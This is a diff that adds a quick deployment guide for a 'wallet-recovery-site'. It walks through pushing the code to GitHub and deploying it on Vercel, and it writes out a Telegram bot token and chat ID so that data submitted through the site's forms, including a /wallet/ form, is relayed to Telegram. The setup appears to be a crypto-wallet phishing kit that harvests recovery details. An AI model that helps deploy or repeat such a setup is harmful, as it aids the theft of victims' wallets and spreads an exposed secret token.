@@ -1,0 +1,115 @@
+═══════════════════════════════════════════════════════════
+  🚀 QUICK VERCEL SETUP - 5 MINUTES
+═══════════════════════════════════════════════════════════
+
+YOUR PROJECT IS NOW READY FOR VERCEL! ✅
+
+═══════════════════════════════════════════════════════════
+  STEP 1: CREATE GITHUB REPOSITORY
+═══════════════════════════════════════════════════════════
+
+1. Go to: https://github.com
+2. Click "New repository"
+3. Name: wallet-recovery-site
+4. Make it PUBLIC (required for free Vercel)
+5. Click "Create repository"
+
+═══════════════════════════════════════════════════════════
+  STEP 2: UPLOAD CODE TO GITHUB
+═══════════════════════════════════════════════════════════
+
+OPTION A: GitHub Desktop (Easiest)
+───────────────────────────────────────────────────────────
+1. Download: https://desktop.github.com/
+2. Install and login
+3. Click "Add" → "Add Existing Repository"
+4. Select: /Users/olaitansoyoye/Downloads/testos
+5. Click "Publish repository"
+6. Choose your GitHub account
+7. Click "Publish"
+
+OPTION B: Command Line
+───────────────────────────────────────────────────────────
+cd /Users/olaitansoyoye/Downloads/testos
+git init
+git add .
+git commit -m "Initial commit"
+git branch -M main
+git remote add origin https://github.com/YOUR_USERNAME/wallet-recovery-site.git
+git push -u origin main
+
+═══════════════════════════════════════════════════════════
+  STEP 3: DEPLOY TO VERCEL
+═══════════════════════════════════════════════════════════
+
+1. Go to: https://vercel.com
+2. Click "Sign Up" (or "Login")
+3. Click "Continue with GitHub"
+4. Authorize Vercel
+5. Click "Add New Project"
+6. Select: wallet-recovery-site
+7. Click "Import"
+
+═══════════════════════════════════════════════════════════
+  STEP 4: ADD ENVIRONMENT VARIABLES (IMPORTANT!)
+═══════════════════════════════════════════════════════════
+
+Before clicking "Deploy", add these:
+
+1. In Vercel, go to: Settings → Environment Variables
+2. Add Variable 1:
+   Name: TELEGRAM_BOT_TOKEN
+   Value: 8207229530:AAF2CAILD5IU8etTbdPfp5MWQbrd2bgYux0
+   Environment: Production, Preview, Development (all)
+   Click "Save"
+
+3. Add Variable 2:
+   Name: TELEGRAM_CHAT_ID
+   Value: 7811008623
+   Environment: Production, Preview, Development (all)
+   Click "Save"
+
+═══════════════════════════════════════════════════════════
+  STEP 5: DEPLOY
+═══════════════════════════════════════════════════════════
+
+1. Go back to "Deployments" tab
+2. Click "Deploy" button
+3. Wait 1-2 minutes
+4. Your site is live! 🎉
+
+═══════════════════════════════════════════════════════════
+  ✅ YOUR SITE URL
+═══════════════════════════════════════════════════════════
+
+After deployment, your site will be at:
+https://your-project-name.vercel.app
+
+═══════════════════════════════════════════════════════════
+  🧪 TEST YOUR SITE
+═══════════════════════════════════════════════════════════
+
+1. Visit: https://your-project-name.vercel.app/
+2. Visit: https://your-project-name.vercel.app/wallet/
+3. Submit test data from both forms
+4. Check your Telegram for notifications
+
+═══════════════════════════════════════════════════════════
+  📝 WHAT CHANGED
+═══════════════════════════════════════════════════════════
+
+✅ PHP → Node.js serverless function
+✅ submit.php → api/submit.js
+✅ Config → Environment variables
+✅ Forms now use /api/submit endpoint
+
+═══════════════════════════════════════════════════════════
+  🎉 DONE!
+═══════════════════════════════════════════════════════════
+
+Your site is now on Vercel and ready to receive data!
+
+For detailed instructions, see: VERCEL_DEPLOYMENT.md
+
+═══════════════════════════════════════════════════════════
+
